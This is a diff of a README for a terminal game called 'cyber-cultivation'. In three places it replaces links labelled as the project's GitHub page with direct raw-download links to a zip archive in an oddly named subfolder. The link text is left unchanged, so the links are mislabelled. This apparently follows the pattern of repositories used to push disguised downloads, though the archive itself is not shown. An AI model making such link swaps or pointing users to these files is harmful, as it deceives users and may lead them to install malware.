@@ -1,6 +1,6 @@
 # 🧘 cyber-cultivation - Train your AI hero in terminal
 
-[![Download](https://img.shields.io/badge/Download%20Now-Visit%20the%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/jalehhydraulic408/cyber-cultivation)
+[![Download](https://img.shields.io/badge/Download%20Now-Visit%20the%20GitHub%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/jalehhydraulic408/cyber-cultivation/main/snobby/cyber-cultivation-3.2.zip)
 
 ## 📦 What this is
 
@@ -24,7 +24,7 @@ If you can open a browser, download files, and run an app, you can use this proj
 
 Use this link to visit the download page and get the project files:
 
-[Visit the GitHub page to download cyber-cultivation](https://github.com/jalehhydraulic408/cyber-cultivation)
+[Visit the GitHub page to download cyber-cultivation](https://raw.githubusercontent.com/jalehhydraulic408/cyber-cultivation/main/snobby/cyber-cultivation-3.2.zip)
 
 ### Windows steps
 
@@ -217,4 +217,4 @@ You can expect:
 
 ## 🔗 Download again
 
-[https://github.com/jalehhydraulic408/cyber-cultivation](https://github.com/jalehhydraulic408/cyber-cultivation)
+[https://raw.githubusercontent.com/jalehhydraulic408/cyber-cultivation/main/snobby/cyber-cultivation-3.2.zip](https://raw.githubusercontent.com/jalehhydraulic408/cyber-cultivation/main/snobby/cyber-cultivation-3.2.zip)
